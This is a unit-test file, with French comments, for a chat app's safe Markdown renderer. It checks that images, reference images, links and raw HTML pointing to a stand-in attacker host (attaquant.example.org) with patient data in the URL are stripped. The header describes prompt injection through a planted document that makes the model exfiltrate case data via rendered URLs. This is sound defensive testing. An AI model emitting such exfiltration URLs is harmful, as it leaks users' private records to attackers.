// Rendu des réponses du chat (src/lib/safeMarkdown.ts, issue 33, audit S5).
// Un document piégé peut faire écrire au modèle une image ou un lien vers un
// site extérieur, avec des données du dossier dans l'URL. Rien de tel ne doit
// sortir du rendu. `npm run test:unit` compile src/lib dans .unit-test/.
import assert from "node:assert/strict";
import { test } from "node:test";
import React from "react";
import ReactDOMServer from "react-dom/server";
import Markdown from "react-markdown";
import { SAFE_MARKDOWN_OPTIONS } from "../../.unit-test/safeMarkdown.js";

const EXFIL = "https://attaquant.example.org/x?d=Patient%20Test%2001.01.1970";

function render(markdown) {
  return ReactDOMServer.renderToStaticMarkup(
    React.createElement(Markdown, { ...SAFE_MARKDOWN_OPTIONS, children: markdown }),
  );
}

test("an image written by the model is not rendered", () => {
  const html = render(`Résumé du dossier.\n\n![](${EXFIL})`);
  assert.doesNotMatch(html, /<img/i);
  assert.ok(!html.includes("attaquant.example.org"), html);
});

test("a reference-style image is not rendered either", () => {
  const html = render(`Voir ![schéma][1].\n\n[1]: ${EXFIL}`);
  assert.doesNotMatch(html, /<img/i);
  assert.ok(!html.includes("attaquant.example.org"), html);
});

test("a link keeps its text but loses its address", () => {
  const html = render(`Plus d'informations [ici](${EXFIL}).`);
  assert.doesNotMatch(html, /<a[\s>]/i);
  assert.ok(!html.includes("attaquant.example.org"), html);
  assert.match(html, /ici/);
});

test("raw HTML is dropped", () => {
  const html = render(`Texte <img src="${EXFIL}"> suite`);
  assert.doesNotMatch(html, /<img/i);
  assert.ok(!html.includes("attaquant.example.org"), html);
});

test("ordinary formatting still renders", () => {
  const html = render("**Diagnostic** : lombalgie\n\n- point 1\n- point 2");
  assert.match(html, /<strong>Diagnostic<\/strong>/);
  assert.match(html, /<li>point 1<\/li>/);
});
